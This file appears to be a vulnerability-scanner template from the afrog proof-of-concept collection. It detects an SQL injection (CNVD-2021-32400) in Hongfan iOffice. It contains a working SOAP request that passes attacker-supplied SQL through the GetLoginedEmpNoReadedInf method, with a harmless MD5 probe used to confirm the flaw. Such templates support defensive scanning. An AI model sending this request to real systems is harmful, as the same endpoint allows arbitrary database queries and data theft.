pocs/afrog-pocs/vulnerability/yaml-poc-hongfan-ioffice-sql_injection-CNVD-2021-32400.yml

name: yaml-poc-hongfan-ioffice-sql_injection-CNVD-2021-32400
binding: 80585508-b2f8-4ab4-b350-9a52c7d3b709
detail:
    author: system_user
    links:
        - http://www.ioffice.cn/newsinfo/1616026.html
    vulnerability:
        id: 8f2c84ae-3ec0-4162-b784-ffaf672aab71
        level: high
transport: http
set:
    r1: randomInt(2000000, 4000000)
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /ioffice/prg/set/wss/ioAssistance.asmx
            headers:
                Content-Type: text/xml; charset=utf-8
            body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n      <sql>select SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{r1}}')),3,32)</sql>\r\n    </GetLoginedEmpNoReadedInf>\r\n  </soap:Body>\r\n</soap:Envelope>"
            follow_redirects: true
        expression: response.status == 200 && response.body.bcontains(b"<Column1>") && response.body.bcontains(bytes(md5(string(r1))))
expression: r1()
